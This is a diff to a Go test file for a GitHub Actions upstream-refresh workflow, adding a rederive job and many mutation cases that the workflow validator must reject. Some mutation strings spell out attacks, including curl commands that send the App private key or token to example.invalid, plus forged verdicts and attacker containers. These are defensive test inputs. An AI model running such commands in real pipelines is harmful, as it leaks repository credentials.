@@ -1341,6 +1341,10 @@ const upstreamRefreshWorkflowFixture = `name: Upstream refresh
 on:
   workflow_dispatch:
 
+defaults:
+  run:
+    shell: bash --noprofile --norc -euo pipefail {0}
+
 jobs:
   refresh:
     runs-on: ubuntu-latest
@@ -1401,6 +1405,7 @@ jobs:
     if: github.ref == 'refs/heads/main' && needs.refresh.outputs.candidate == 'true'
     outputs:
       result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}
+      toolchain: ${{ steps.toolchain_guard.outcome == 'success' && steps.toolchain_guard.outputs.verdict || 'failed' }}
     permissions:
       contents: read
     steps:
@@ -1416,10 +1421,44 @@ jobs:
         continue-on-error: true
         run: |
           ./scripts/ci/upstream-refresh-scope-guard.sh "${RUNNER_TEMP}/candidate/provider/patch"
+      - id: toolchain_guard
+        shell: bash --noprofile --norc -euo pipefail {0}
+        continue-on-error: true
+        run: ./scripts/ci/upstream-refresh-scope-guard.sh --toolchain "${RUNNER_TEMP}/candidate/toolchain/patch" "${GITHUB_OUTPUT}"
+  rederive:
+    runs-on: ubuntu-latest
+    needs: [refresh]
+    if: github.ref == 'refs/heads/main' && needs.refresh.outputs.candidate == 'true'
+    timeout-minutes: 20
+    outputs:
+      toolchain: ${{ steps.rederive.outcome == 'success' && steps.rederive.outputs.verdict || 'failed' }}
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: upstream-refresh-candidate
+          path: ${{ runner.temp }}/candidate
+      - id: rederive
+        shell: bash --noprofile --norc -euo pipefail {0}
+        continue-on-error: true
+        timeout-minutes: 15
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+          WORKCELL_DEBIAN_PLAN_RECORD: ${{ runner.temp }}/upstream-refresh-rederive-debian-plan.json
+        run: |
+          token_file="$(mktemp "${RUNNER_TEMP}/workcell-github-api-token.XXXXXX")"
+          (umask 077 && printf '%s' "${GITHUB_TOKEN}" >"${token_file}")
+          unset GITHUB_TOKEN GH_TOKEN
+          trap 'rm -f "${token_file}"' EXIT
+          WORKCELL_GITHUB_API_TOKEN_FILE="${token_file}" ./scripts/ci/upstream-refresh-rederive.sh "${RUNNER_TEMP}/candidate/toolchain" "${GITHUB_OUTPUT}"
   publish:
     runs-on: ubuntu-latest
-    needs: [refresh, scope-guard]
-    if: github.ref == 'refs/heads/main' && needs.refresh.outputs.candidate == 'true'
+    needs: [refresh, scope-guard, rederive]
+    if: ${{ !cancelled() && github.ref == 'refs/heads/main' && needs.refresh.result == 'success' && needs.scope-guard.result == 'success' && needs.refresh.outputs.candidate == 'true' }}
     environment:
       name: upstream-refresh
     permissions:
@@ -1460,8 +1499,10 @@ jobs:
         env:
           GH_TOKEN: ${{ steps.app-token.outputs.token }}
           SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}
+          TOOLCHAIN_SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.toolchain }}
+          TOOLCHAIN_REDERIVE_RESULT: ${{ needs.rederive.result == 'success' && needs.rederive.outputs.toolchain || 'failed' }}
         run: |
-          ./scripts/ci/upstream-refresh-publish.sh candidate "${SCOPE_GUARD_RESULT}" audit.md
+          ./scripts/ci/upstream-refresh-publish.sh candidate "${SCOPE_GUARD_RESULT}" "${TOOLCHAIN_SCOPE_GUARD_RESULT}" "${TOOLCHAIN_REDERIVE_RESULT}" audit.md
   report:
     needs: [refresh]
     runs-on: ubuntu-latest
@@ -1486,6 +1527,17 @@ func TestValidateUpstreamRefreshWorkflowAcceptsCanonicalFlow(t *testing.T) {
 	assertManualWorkflowMainRefGuard(t, workflow, metadatautil.ValidateUpstreamRefreshWorkflow)
 }
 
+// upstreamRefreshRederiveJobFixture returns the whole rederive job of the
+// fixture, so a mutation can remove it.
+func upstreamRefreshRederiveJobFixture() string {
+	start := strings.Index(upstreamRefreshWorkflowFixture, "  rederive:\n")
+	end := strings.Index(upstreamRefreshWorkflowFixture, "  publish:\n")
+	if start < 0 || end < start {
+		panic("upstream refresh fixture has no rederive job before publish")
+	}
+	return upstreamRefreshWorkflowFixture[start:end]
+}
+
 func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 	t.Parallel()
 	mutations := []struct {
@@ -1506,9 +1558,10 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"publish missing environment", "    environment:\n      name: upstream-refresh\n", "", "publish job must bind the upstream-refresh environment"},
 		{"scope-guard checkout from another repository", "          persist-credentials: false\n      - uses: actions/download", "          persist-credentials: false\n          repository: evil/other\n      - uses: actions/download", "reviewed checkout, candidate download"},
 		{"refresh publishes behind a line continuation", "          gh issue create --title \"Upstream refresh candidate\"", "          gh pr \\\n            create --fill\n          gh issue create --title \"Upstream refresh candidate\"", "must not contain \"gh pr create\""},
-		{"publish missing scope-guard need", "needs: [refresh, scope-guard]", "needs: [refresh]", "publish job must need exactly"},
-		{"publish step chains another command", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n          gh pr merge 1\n", "must run only the publish script"},
-		{"publish step reads the private key", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: echo\n", "App token only in the publish script step"},
+		{"publish missing scope-guard need", "needs: [refresh, scope-guard, rederive]", "needs: [refresh, rederive]", "publish job must need exactly"},
+		{"publish missing rederive need", "needs: [refresh, scope-guard, rederive]", "needs: [refresh, scope-guard]", "publish job must need exactly"},
+		{"publish step chains another command", "candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n          gh pr merge 1\n", "must run only the publish script"},
+		{"publish step reads the private key", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n      - env:\n          K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: echo\n", "App token only in the publish script step"},
 		{"publish service reads the private key", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: ubuntu-latest\n    services:\n      s:\n        image: registry.example.invalid/x\n        credentials:\n          username: u\n          password: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "must not run in a container or services"},
 		{"publisher step gains an env", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n          X: y\n", "must run only the publish script"},
 		{"presence step leaks the private key", "      - id: app-token\n", "      - id: secrets\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: curl -d \"${APP_PRIVATE_KEY}\" https://example.invalid\n      - id: app-token\n", "App token only in the publish script step"},
@@ -1518,23 +1571,85 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"publish job env sets BASH_ENV", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      BASH_ENV: ./wrapper.sh\n", "not inherit workflow or job env"},
 		{"publisher drops its shell pin", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        if: steps.secrets.outputs.present == 'true'\n", "      - if: steps.secrets.outputs.present == 'true'\n", "must run only the publish script"},
 		{"publish replaces the script before running it", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        if:", "      - run: echo x > scripts/ci/upstream-refresh-publish.sh\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        if:", "must not run other steps before the publish script"},
-		{"publish step reads the whole steps context", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          T: ${{ toJSON(STEPS) }}\n        run: echo\n", "App token only in the publish script step"},
+		{"publish step reads the whole steps context", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n      - env:\n          T: ${{ toJSON(STEPS) }}\n        run: echo\n", "App token only in the publish script step"},
 		{"scope-guard runs in a container", "    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "    container: attacker/image\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "must run on ubuntu-latest and must not run in a container"},
 		{"publish runs on a self-hosted runner", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: self-hosted\n", "must run on ubuntu-latest"},
 		{"scope-guard step moves its working directory", "      - id: guard\n", "      - id: guard\n        working-directory: attacker\n", "scope-guard job must run the scope guard as its only run step"},
 		{"publisher moves its working directory", "        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "        working-directory: attacker\n        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "must run only the publish script"},
-		{"workflow default working directory", "jobs:\n  refresh:\n", "defaults:\n  run:\n    working-directory: attacker\njobs:\n  refresh:\n", "not inherit workflow or job env"},
+		{"workflow default working directory", "    shell: bash --noprofile --norc -euo pipefail {0}\n\njobs:", "    shell: bash --noprofile --norc -euo pipefail {0}\n    working-directory: attacker\n\njobs:", "not inherit workflow or job env"},
 		{"publish job defaults", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: attacker\n", "not inherit workflow or job env"},
-		{"post-publish step sends the token from its shell", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - shell: curl -d ${{ steps.app-token.outputs.token }} https://example.invalid; bash {0}\n        run: \"true\"\n", "App token only in the publish script step"},
-		{"post-publish step puts the token in its working directory", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - working-directory: /tmp/${{ steps.app-token.outputs.token }}\n        run: echo \"${PWD}\"\n", "App token only in the publish script step"},
+		{"post-publish step sends the token from its shell", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n      - shell: curl -d ${{ steps.app-token.outputs.token }} https://example.invalid; bash {0}\n        run: \"true\"\n", "App token only in the publish script step"},
+		{"post-publish step puts the token in its working directory", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md\n      - working-directory: /tmp/${{ steps.app-token.outputs.token }}\n        run: echo \"${PWD}\"\n", "App token only in the publish script step"},
 		{"mint step injects NODE_OPTIONS", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n        env:\n          NODE_OPTIONS: --require ./wrapper.js\n", "must mint the App token"},
 		{"presence step uses a wrapper shell", "      - id: app-token\n", "      - id: secrets\n        shell: ./wrap {0}\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: |\n          if [[ -z \"${APP_CLIENT_ID}\" || -z \"${APP_PRIVATE_KEY}\" ]]; then\n            echo \"present=false\" >> \"${GITHUB_OUTPUT}\"\n            echo \"::notice::The upstream-refresh App credentials are not configured. Publication is skipped. See docs/github-workflows.md.\"\n            exit 0\n          fi\n          echo \"present=true\" >> \"${GITHUB_OUTPUT}\"\n      - id: app-token\n", "App token only in the publish script step"},
-		{"publish hard-codes the guard result", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md", "candidate passed audit.md", "second publish script argument"},
+		{"toolchain verdict forged", "toolchain: ${{ steps.toolchain_guard.outcome == 'success' && steps.toolchain_guard.outputs.verdict || 'failed' }}", "toolchain: passed:${{ github.sha }}:${{ github.sha }}", "must export toolchain from the toolchain guard step"},
+		{"toolchain verdict ignores the outcome", "toolchain: ${{ steps.toolchain_guard.outcome == 'success' && steps.toolchain_guard.outputs.verdict || 'failed' }}", "toolchain: ${{ steps.toolchain_guard.outputs.verdict }}", "must export toolchain from the toolchain guard step"},
+		{"scope-guard extra output", "      toolchain: ${{ steps", "      other: x\n      toolchain: ${{ steps", "must export result from the guard step outcome"},
+		{"toolchain guard skipped", "      - id: toolchain_guard\n", "      - id: toolchain_guard\n        if: false\n", "must run the scope guard as its only run step"},
+		{"toolchain guard checks the provider patch", "--toolchain \"${RUNNER_TEMP}/candidate/toolchain/patch\"", "--toolchain \"${RUNNER_TEMP}/candidate/provider/patch\"", "must run the scope guard as its only run step"},
+		{"toolchain guard writes elsewhere", "toolchain/patch\" \"${GITHUB_OUTPUT}\"", "toolchain/patch\" \"${RUNNER_TEMP}/out\"\n          echo verdict=passed:x:y >> \"${GITHUB_OUTPUT}\"", "must run the scope guard as its only run step"},
+		{"toolchain guard gains an env", "      - id: toolchain_guard\n", "      - id: toolchain_guard\n        env:\n          BASH_ENV: ./wrap.sh\n", "must run the scope guard as its only run step"},
+		{"toolchain guard loses continue-on-error", "        continue-on-error: true\n        run: ./scripts/ci/upstream-refresh-scope-guard.sh --toolchain", "        run: ./scripts/ci/upstream-refresh-scope-guard.sh --toolchain", "must run the scope guard as its only run step"},
+		{"publish hard-codes the toolchain verdict", "\"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md", "passed:a:b \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md", "third publish script argument"},
+		{"publish hard-codes the rederive verdict", "\"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md", "rederived:a:b audit.md", "fourth publish script argument"},
+		{"publish drops the rederive verdict", " \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md", " audit.md", "second publish script argument"},
+		{"publish ignores the rederive verdict", "TOOLCHAIN_REDERIVE_RESULT: ${{ needs.rederive.result == 'success' && needs.rederive.outputs.toolchain || 'failed' }}", "TOOLCHAIN_REDERIVE_RESULT: rederived", "must pass the rederive verdict"},
+		{"rederive job removed", upstreamRefreshRederiveJobFixture(), "", "must define exactly the refresh, scope-guard, rederive, publish, and report jobs"},
+		{"rederive job renamed with its step timeout", "  rederive:\n    runs-on", "  rederive-old:\n    runs-on", "only the rederive step may set"},
+		{"rederive job runs on every ref", "    needs: [refresh]\n    if: github.ref == 'refs/heads/main' && needs.refresh.outputs.candidate == 'true'", "    needs: [refresh]\n    if: always()", "rederive job must run only when"},
+		{"rederive job contents write", "      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "      contents: write\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "rederive job must grant exactly contents: read"},
+		{"rederive job gains a token scope", "      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "      contents: read\n      pull-requests: write\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "rederive job must grant exactly contents: read"},
+		{"rederive job waits on the scope guard", "  rederive:\n    runs-on: ubuntu-latest\n    needs: [refresh]", "  rederive:\n    runs-on: ubuntu-latest\n    needs: [refresh, scope-guard]", "rederive job must need exactly refresh"},
+		{"rederive job env", "  rederive:\n    runs-on: ubuntu-latest\n", "  rederive:\n    env:\n      BASH_ENV: ./wrap.sh\n    runs-on: ubuntu-latest\n", "rederive job must not set job env"},
+		{"rederive job defaults", "  rederive:\n    runs-on: ubuntu-latest\n", "  rederive:\n    defaults:\n      run:\n        working-directory: attacker\n    runs-on: ubuntu-latest\n", "rederive job must not set job env, defaults"},
+		{"rederive job matrix", "  rederive:\n    runs-on: ubuntu-latest\n", "  rederive:\n    strategy:\n      matrix:\n        include:\n          - x: 1\n    runs-on: ubuntu-latest\n", "rederive job must not set job env, defaults, or a strategy"},
+		{"rederive job in a container", "  rederive:\n    runs-on: ubuntu-latest\n", "  rederive:\n    container: attacker/image\n    runs-on: ubuntu-latest\n", "must not run in a container"},
+		{"rederive job on a self-hosted runner", "  rederive:\n    runs-on: ubuntu-latest\n", "  rederive:\n    runs-on: self-hosted\n", "must run on ubuntu-latest"},
+		{"rederive job binds the environment", "  rederive:\n    runs-on: ubuntu-latest\n", "  rederive:\n    environment:\n      name: upstream-refresh\n    runs-on: ubuntu-latest\n", "rederive job must not bind an environment"},
+		{"rederive verdict forged", "toolchain: ${{ steps.rederive.outcome == 'success' && steps.rederive.outputs.verdict || 'failed' }}", "toolchain: rederived:${{ github.sha }}:${{ github.sha }}", "rederive job must export only toolchain"},
+		{"rederive verdict ignores the outcome", "toolchain: ${{ steps.rederive.outcome == 'success' && steps.rederive.outputs.verdict || 'failed' }}", "toolchain: ${{ steps.rederive.outputs.verdict }}", "rederive job must export only toolchain"},
+		{"rederive extra output", "      toolchain: ${{ steps.rederive", "      other: x\n      toolchain: ${{ steps.rederive", "rederive job must export only toolchain"},
+		{"rederive script replaced first", "      - id: rederive\n", "      - run: echo 'exit 0' > ./scripts/ci/upstream-refresh-rederive.sh\n      - id: rederive\n", "rederive job must be the reviewed checkout"},
+		{"rederive installs cosign again", "      - id: rederive\n", "      - uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1\n      - id: rederive\n", "rederive job must be the reviewed checkout"},
+		{"rederive loads tool pins", "      - id: rederive\n", "      - id: pins\n        run: ./scripts/ci/load-tool-pins.sh\n      - id: rederive\n", "rederive job must be the reviewed checkout"},
+		{"rederive checkout from another repository", "          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "          persist-credentials: false\n          repository: evil/other\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "rederive job must be the reviewed checkout"},
+		{"rederive downloads another artifact", "          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "          name: other\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "rederive job must be the reviewed checkout"},
+		{"rederive download skipped", "          path: ${{ runner.temp }}/candidate\n      - id: rederive", "          path: ${{ runner.temp }}/candidate\n        if: false\n      - id: rederive", "rederive job must be the reviewed checkout"},
+		{"rederive checkout moves its working directory", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        working-directory: attacker\n        with:\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: upstream-refresh-candidate\n          path: ${{ runner.temp }}/candidate\n      - id: rederive", "rederive job must be the reviewed checkout"},
+		{"rederive step loses continue-on-error", "      - id: rederive\n        shell: bash --noprofile --norc -euo pipefail {0}\n        continue-on-error: true\n", "      - id: rederive\n        shell: bash --noprofile --norc -euo pipefail {0}\n", "must run the reviewed rederive step"},
+		{"rederive step timeout dropped", "        timeout-minutes: 15\n", "", "rederive step must set timeout-minutes: 15"},
+		{"rederive step timeout raised to the job's", "        timeout-minutes: 15\n", "        timeout-minutes: 20\n", "rederive step must set timeout-minutes: 15"},
+		{"rederive step timeout above the job's", "        timeout-minutes: 15\n", "        timeout-minutes: 30\n", "rederive step must set timeout-minutes: 15"},
+		{"rederive step timeout as an expression", "        timeout-minutes: 15\n", "        timeout-minutes: ${{ 15 }}\n", "rederive step must set timeout-minutes: 15"},
+		{"rederive job timeout lowered below the step's", "    timeout-minutes: 20\n    outputs:\n      toolchain", "    timeout-minutes: 10\n    outputs:\n      toolchain", "rederive job must set timeout-minutes: 20"},
+		{"rederive job timeout dropped", "    timeout-minutes: 20\n    outputs:\n      toolchain", "    outputs:\n      toolchain", "rederive job must set timeout-minutes: 20"},
+		{"step timeout outside the rederive step", "      - id: toolchain_guard\n", "      - id: toolchain_guard\n        timeout-minutes: 1\n", "only the rederive step may set"},
+		{"rederive step skipped", "      - id: rederive\n", "      - id: rederive\n        if: false\n", "must run the reviewed rederive step"},
+		{"rederive step renamed", "      - id: rederive\n        shell: bash --noprofile --norc -euo pipefail {0}\n        continue-on-error: true\n        timeout-minutes: 15\n", "      - id: check\n        shell: bash --noprofile --norc -euo pipefail {0}\n        continue-on-error: true\n", "must run the reviewed rederive step"},
+		{"rederive step renamed with its timeout", "      - id: rederive\n", "      - id: check\n", "only the rederive step may set"},
+		{"rederive step moves its working directory", "      - id: rederive\n", "      - id: rederive\n        working-directory: attacker\n", "must run the reviewed rederive step"},
+		{"rederive step gains an env", "          WORKCELL_DEBIAN_PLAN_RECORD: ${{ runner.temp }}/upstream-refresh-rederive-debian-plan.json\n", "          WORKCELL_DEBIAN_PLAN_RECORD: ${{ runner.temp }}/upstream-refresh-rederive-debian-plan.json\n          BASH_ENV: ./wrap.sh\n", "must run the reviewed rederive step"},
+		{"rederive step gets another token", "          GITHUB_TOKEN: ${{ github.token }}\n          WORKCELL_DEBIAN_PLAN_RECORD", "          GITHUB_TOKEN: ${{ secrets.OTHER_PAT }}\n          WORKCELL_DEBIAN_PLAN_RECORD", "must run the reviewed rederive step"},
+		{"rederive step re-derives the provider candidate", "upstream-refresh-rederive.sh \"${RUNNER_TEMP}/candidate/toolchain\"", "upstream-refresh-rederive.sh \"${RUNNER_TEMP}/candidate/provider\"", "must run the reviewed rederive step"},
+		{"rederive step forges its verdict", "\"${RUNNER_TEMP}/candidate/toolchain\" \"${GITHUB_OUTPUT}\"\n", "\"${RUNNER_TEMP}/candidate/toolchain\" \"${GITHUB_OUTPUT}\" || echo verdict=rederived:a:b >> \"${GITHUB_OUTPUT}\"\n", "must run the reviewed rederive step"},
+		{"rederive step writes elsewhere", "\"${RUNNER_TEMP}/candidate/toolchain\" \"${GITHUB_OUTPUT}\"\n", "\"${RUNNER_TEMP}/candidate/toolchain\" \"${RUNNER_TEMP}/out\"\n", "must run the reviewed rederive step"},
+		{"rederive step shell override", "      - id: rederive\n        shell: bash --noprofile --norc -euo pipefail {0}\n", "      - id: rederive\n        shell: sh -c 'exit 0' {0}\n", "must run the reviewed rederive step"},
+		{"rederive step mints the App token", "      - id: rederive\n", "      - uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n      - id: rederive\n", "rederive job must not mint the GitHub App token"},
+		{"publish runs on a cancelled run", "${{ !cancelled() && github.ref", "${{ always() && github.ref", "publish job must run only when"},
+		{"publish runs after a failed scope guard", " && needs.scope-guard.result == 'success'", "", "publish job must run only when"},
+		{"publish runs after a failed refresh", " && needs.refresh.result == 'success'", "", "publish job must run only when"},
+		{"publish waits on the rederive job", "needs.scope-guard.result == 'success' && needs.refresh", "needs.scope-guard.result == 'success' && needs.rederive.result == 'success' && needs.refresh", "publish job must run only when"},
+		{"publish trusts a failed rederive job's output", "TOOLCHAIN_REDERIVE_RESULT: ${{ needs.rederive.result == 'success' && needs.rederive.outputs.toolchain || 'failed' }}", "TOOLCHAIN_REDERIVE_RESULT: ${{ needs.rederive.outputs.toolchain }}", "must pass the rederive verdict"},
+		{"workflow default shell changed", "defaults:\n  run:\n    shell: bash --noprofile --norc -euo pipefail {0}\n", "defaults:\n  run:\n    shell: bash {0}\n", "workflow run defaults other than shell"},
+		{"workflow default shell removed", "defaults:\n  run:\n    shell: bash --noprofile --norc -euo pipefail {0}\n\n", "", "workflow run defaults other than shell"},
+		{"publish drops the toolchain verdict", " \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md", " audit.md", "second publish script argument"},
+		{"publish ignores the toolchain verdict", "TOOLCHAIN_SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.toolchain }}", "TOOLCHAIN_SCOPE_GUARD_RESULT: passed", "must pass the toolchain scope-guard verdict"},
+		{"publish hard-codes the guard result", "candidate \"${SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_SCOPE_GUARD_RESULT}\" \"${TOOLCHAIN_REDERIVE_RESULT}\" audit.md", "candidate passed audit.md", "second publish script argument"},
 		{"publish ignores scope-guard result", "SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}", "SCOPE_GUARD_RESULT: passed", "must pass the scope-guard result"},
 		{"publish App token extra permission", "          permission-pull-requests: write\n", "          permission-pull-requests: write\n          permission-workflows: write\n", "only contents and pull-requests write"},
 		{"publish App token renamed step", "      - id: app-token\n", "      - id: token\n", "as step app-token"},
-		{"second publisher fails open", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        if: always()\n        run: ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "must pass the scope-guard result"},
-		{"second gated publisher", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        if: steps.secrets.outputs.present == 'true'\n        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n        run: |\n          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "run the publish script once"},
